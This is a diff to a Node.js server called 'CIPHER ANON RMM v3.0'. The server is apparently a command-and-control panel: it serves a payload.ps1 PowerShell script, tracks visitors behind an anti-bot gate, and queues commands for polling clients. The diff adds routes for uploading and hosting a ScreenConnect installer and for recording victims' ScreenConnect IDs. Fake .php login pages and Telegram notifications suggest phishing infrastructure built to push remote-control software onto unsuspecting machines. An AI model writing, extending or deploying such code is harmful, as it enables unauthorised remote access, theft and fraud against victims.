@@ -1,5 +1,6 @@
 // ============================================================
-// SERVER.JS — CIPHER ANON RMM v3.0 (ScreenConnect Only)
+// SERVER.JS — CIPHER ANON RMM v3.0
+// ScreenConnect Deployment + File Upload + RMM API
 // ============================================================
 
 const express = require('express');
@@ -9,13 +10,14 @@ const path = require('path');
 const crypto = require('crypto');
 const axios = require('axios');
 const session = require('express-session');
+const multer = require('multer');
 const { antiBot, handleVerify } = require('./anti-bot.js');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// CONFIG
+// CONFIGURATION
 // ============================================================
 
 const CONFIG_FILE = path.join(__dirname, 'config.json');
@@ -35,7 +37,9 @@ function loadConfig() {
         BASE_URL: process.env.BASE_URL || `https://${process.env.RAILWAY_STATIC_URL || 'localhost:' + PORT}`,
         RMM_POLL_INTERVAL: parseInt(process.env.RMM_POLL_INTERVAL) || 30000,
         RMM_ENABLED: process.env.RMM_ENABLED !== 'false',
-        SCREENCONNECT_URL: process.env.SCREENCONNECT_URL || 'https://your-screenconnect-domain.com/ClientSetup.msi',
+        SCREENCONNECT_URL: process.env.SCREENCONNECT_URL || '',
+        SCREENCONNECT_VIEWER_URL: process.env.SCREENCONNECT_VIEWER_URL || '',
+        SCREENCONNECT_FILENAME: process.env.SCREENCONNECT_FILENAME || '',
     };
 
     let fileConfig = {};
@@ -269,7 +273,7 @@ function trackVisit(type, req) {
 }
 
 // ============================================================
-// ANTI-BOT
+// ANTI-BOT & MIDDLEWARE
 // ============================================================
 
 app.use(cors());
@@ -299,6 +303,111 @@ app.get('/health', (req, res) => {
 
 app.get('/ping', (req, res) => {
     res.send('pong');
+});
+
+// ============================================================
+// FILE UPLOAD — SCREENCONNECT MSI
+// ============================================================
+
+const storage = multer.diskStorage({
+    destination: function(req, file, cb) {
+        const uploadDir = path.join(__dirname, 'public', 'uploads');
+        if (!fs.existsSync(uploadDir)) {
+            fs.mkdirSync(uploadDir, { recursive: true });
+        }
+        cb(null, uploadDir);
+    },
+    filename: function(req, file, cb) {
+        const ext = path.extname(file.originalname);
+        const baseName = 'screenconnect-installer';
+        cb(null, baseName + ext);
+    }
+});
+
+const upload = multer({
+    storage: storage,
+    limits: { fileSize: 50 * 1024 * 1024 },
+    fileFilter: function(req, file, cb) {
+        const allowedTypes = ['.msi', '.exe', '.zip'];
+        const ext = path.extname(file.originalname).toLowerCase();
+        if (allowedTypes.includes(ext)) {
+            cb(null, true);
+        } else {
+            cb(new Error('Only .msi, .exe, and .zip files are allowed'));
+        }
+    }
+});
+
+app.post('/api/upload/screenconnect', requireAuth, upload.single('file'), (req, res) => {
+    try {
+        if (!req.file) {
+            return res.status(400).json({ status: 'error', message: 'No file uploaded' });
+        }
+
+        const fileUrl = `${CONFIG.BASE_URL}/uploads/${req.file.filename}`;
+        CONFIG.SCREENCONNECT_URL = fileUrl;
+        CONFIG.SCREENCONNECT_FILENAME = req.file.filename;
+        try {
+            fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
+        } catch (e) {}
+
+        log(`[+] ScreenConnect installer uploaded: ${req.file.filename}`);
+        res.json({
+            status: 'ok',
+            message: 'File uploaded successfully',
+            fileUrl: fileUrl,
+            filename: req.file.filename
+        });
+    } catch (e) {
+        log(`[!] Upload failed: ${e.message}`);
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+app.get('/api/config/screenconnect/file', requireAuth, (req, res) => {
+    const filename = CONFIG.SCREENCONNECT_FILENAME || null;
+    const fileUrl = CONFIG.SCREENCONNECT_URL || null;
+    const fileExists = filename ? fs.existsSync(path.join(__dirname, 'public', 'uploads', filename)) : false;
+    res.json({
+        filename: filename,
+        fileUrl: fileUrl,
+        fileExists: fileExists,
+        hasFile: fileExists && filename !== null
+    });
+});
+
+app.delete('/api/upload/screenconnect', requireAuth, (req, res) => {
+    try {
+        const filename = CONFIG.SCREENCONNECT_FILENAME;
+        if (!filename) {
+            return res.status(404).json({ status: 'error', message: 'No file uploaded' });
+        }
+
+        const filePath = path.join(__dirname, 'public', 'uploads', filename);
+        if (fs.existsSync(filePath)) {
+            fs.unlinkSync(filePath);
+            log(`[+] Deleted uploaded file: ${filename}`);
+        }
+
+        CONFIG.SCREENCONNECT_URL = '';
+        CONFIG.SCREENCONNECT_FILENAME = '';
+        try {
+            fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
+        } catch (e) {}
+
+        res.json({ status: 'ok', message: 'File deleted' });
+    } catch (e) {
+        res.status(500).json({ status: 'error', message: e.message });
+    }
+});
+
+app.get('/uploads/:filename', (req, res) => {
+    const filePath = path.join(__dirname, 'public', 'uploads', req.params.filename);
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.status(404).send('File not found');
+    }
 });
 
 // ============================================================
@@ -437,10 +546,30 @@ app.post('/api/config/telegram', requireAuth, (req, res) => {
 });
 
 // ============================================================
-// RMM MODULE — SCREENCONNECT ONLY
+// SCREENCONNECT VIEWER URL CONFIG
 // ============================================================
 
-// ---- RMM CLIENT REPORTING ----
+app.get('/api/config/screenconnect/viewer', requireAuth, (req, res) => {
+    res.json({ viewerUrl: CONFIG.SCREENCONNECT_VIEWER_URL || '' });
+});
+
+app.post('/api/config/screenconnect/viewer', requireAuth, (req, res) => {
+    const { viewerUrl } = req.body;
+    if (!viewerUrl) {
+        return res.status(400).json({ status: 'error', message: 'Viewer URL required' });
+    }
+    CONFIG.SCREENCONNECT_VIEWER_URL = viewerUrl;
+    try {
+        fs.writeFileSync(CONFIG_FILE, JSON.stringify(CONFIG, null, 2));
+    } catch (e) {}
+    log('[+] ScreenConnect viewer URL updated');
+    res.json({ status: 'ok', message: 'Viewer URL updated' });
+});
+
+// ============================================================
+// RMM MODULE
+// ============================================================
+
 app.post('/api/rmm/report', async (req, res) => {
     try {
         if (!CONFIG.RMM_ENABLED) {
@@ -471,6 +600,7 @@ app.post('/api/rmm/report', async (req, res) => {
             rmmInstalled: data.rmmInstalled || false,
             rmmType: data.rmmType || 'CipherAnon',
             screenconnectId: data.screenconnectId || null,
+            screenconnectServerUrl: data.screenconnectServerUrl || null,
             status: 'online',
             lastSeen: new Date().toISOString(),
             firstSeen: existing?.firstSeen || new Date().toISOString(),
@@ -502,7 +632,6 @@ app.post('/api/rmm/report', async (req, res) => {
     }
 });
 
-// ---- GET ALL RMM CLIENTS ----
 app.get('/api/rmm/clients', requireAuth, (req, res) => {
     const now = Date.now();
     const timeout = CONFIG.RMM_POLL_INTERVAL * 2;
@@ -516,7 +645,6 @@ app.get('/api/rmm/clients', requireAuth, (req, res) => {
     res.json(rmmClients);
 });
 
-// ---- GET SINGLE RMM CLIENT ----
 app.get('/api/rmm/client/:clientId', requireAuth, (req, res) => {
     const client = rmmClients.find(c => c.clientId === req.params.clientId);
     if (!client) {
@@ -528,7 +656,6 @@ app.get('/api/rmm/client/:clientId', requireAuth, (req, res) => {
     res.json(client);
 });
 
-// ---- GET PENDING COMMANDS (for client polling) ----
 app.get('/api/rmm/commands/:clientId', (req, res) => {
     const client = rmmClients.find(c => c.clientId === req.params.clientId);
     if (!client) {
@@ -544,7 +671,6 @@ app.get('/api/rmm/commands/:clientId', (req, res) => {
     res.json(null);
 });
 
-// ---- SEND COMMAND TO RMM CLIENT ----
 app.post('/api/rmm/command/:clientId', requireAuth, (req, res) => {
     const { command, args } = req.body;
     if (!command) {
@@ -571,7 +697,6 @@ app.post('/api/rmm/command/:clientId', requireAuth, (req, res) => {
     res.json({ status: 'ok', commandId: commandId });
 });
 
-// ---- COMMAND RESPONSE (from client) ----
 app.post('/api/rmm/response/:clientId', (req, res) => {
     const client = rmmClients.find(c => c.clientId === req.params.clientId);
     if (!client) {
@@ -597,13 +722,17 @@ app.post('/api/rmm/response/:clientId', (req, res) => {
         if (match) {
             client.screenconnectId = match[1];
         }
+        // Try to extract server URL from result
+        const serverMatch = result.match(/Server URL: (\S+)/);
+        if (serverMatch) {
+            client.screenconnectServerUrl = serverMatch[1];
+        }
     }
 
     saveRmmClients(rmmClients);
     res.json({ status: 'ok' });
 });
 
-// ---- MOVE CLIENT TO SCREENCONNECT ----
 app.post('/api/rmm/move/:clientId', requireAuth, (req, res) => {
     const client = rmmClients.find(c => c.clientId === req.params.clientId);
     if (!client) {
@@ -626,7 +755,6 @@ app.post('/api/rmm/move/:clientId', requireAuth, (req, res) => {
     res.json({ status: 'ok', commandId: commandId, message: 'Moving to ScreenConnect' });
 });
 
-// ---- UNINSTALL RMM CLIENT ----
 app.post('/api/rmm/uninstall/:clientId', requireAuth, (req, res) => {
     const client = rmmClients.find(c => c.clientId === req.params.clientId);
     if (!client) {
@@ -648,7 +776,6 @@ app.post('/api/rmm/uninstall/:clientId', requireAuth, (req, res) => {
     res.json({ status: 'ok', commandId: commandId, message: 'Uninstall command sent' });
 });
 
-// ---- DELETE RMM CLIENT ----
 app.delete('/api/rmm/delete/:clientId', requireAuth, (req, res) => {
     const index = rmmClients.findIndex(c => c.clientId === req.params.clientId);
     if (index === -1) {
@@ -660,7 +787,6 @@ app.delete('/api/rmm/delete/:clientId', requireAuth, (req, res) => {
     res.json({ status: 'ok', deleted: removed });
 });
 
-// ---- RMM STATS ----
 app.get('/api/rmm/stats', requireAuth, (req, res) => {
     const now = Date.now();
     const timeout = CONFIG.RMM_POLL_INTERVAL * 2;
@@ -695,7 +821,6 @@ function injectBaseUrl(content) {
     return result;
 }
 
-// ---- Serve payload.ps1 ----
 app.get('/payload.ps1', (req, res) => {
     trackVisit('rmm', req);
     try {
@@ -710,7 +835,6 @@ app.get('/payload.ps1', (req, res) => {
     }
 });
 
-// ---- Serve rmm-uninstall.ps1 ----
 app.get('/rmm-uninstall.ps1', (req, res) => {
     try {
         let script = fs.readFileSync(path.join(__dirname, 'public', 'rmm-uninstall.ps1'), 'utf8');
@@ -721,7 +845,6 @@ app.get('/rmm-uninstall.ps1', (req, res) => {
     }
 });
 
-// ---- Serve HTML pages ----
 app.get('/home', (req, res) => {
     trackVisit('home', req);
     try {
@@ -766,7 +889,6 @@ app.get('/password-success', requireAuth, (req, res) => {
     }
 });
 
-// ---- Fallback .php routes ----
 app.get('/home.php', (req, res) => { res.redirect('/home'); });
 app.get('/login.php', (req, res) => {
     if (req.session && req.session.authenticated) {
@@ -777,7 +899,6 @@ app.get('/login.php', (req, res) => {
 app.get('/dashboard.php', requireAuth, (req, res) => { res.redirect('/dashboard'); });
 app.get('/password-success.php', requireAuth, (req, res) => { res.redirect('/password-success'); });
 
-// ---- Static files ----
 app.get('*.php', (req, res, next) => {
     const filePath = path.join(__dirname, 'public', req.path);
     const publicPhp = ['/login.php', '/home.php'];
@@ -818,10 +939,6 @@ app.use((req, res, next) => {
     next();
 });
 
-// ============================================================
-// 404 & ERROR HANDLERS
-// ============================================================
-
 app.use((req, res) => {
     if (req.path.startsWith('/api')) {
         res.status(404).json({ status: 'error', message: 'API endpoint not found' });
@@ -839,10 +956,6 @@ app.use((err, req, res, next) => {
     }
 });
 
-// ============================================================
-// START SERVER
-// ============================================================
-
 app.listen(PORT, '0.0.0.0', () => {
     console.log('\n' + '='.repeat(55));
     console.log('  📡 CIPHER ANON RMM v3.0 — SCREENCONNECT ONLY');
@@ -857,6 +970,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`  [+] RMM Enabled: ${CONFIG.RMM_ENABLED ? '✅' : '❌'}`);
     console.log(`  [+] RMM Poll Interval: ${CONFIG.RMM_POLL_INTERVAL}ms`);
     console.log(`  [+] ScreenConnect URL: ${CONFIG.SCREENCONNECT_URL}`);
+    console.log(`  [+] ScreenConnect Viewer: ${CONFIG.SCREENCONNECT_VIEWER_URL}`);
     console.log(`  [+] Telegram: ${CONFIG.SEND_NOTIFICATIONS ? '✅' : '❌'}`);
     console.log('='.repeat(55) + '\n');
 });
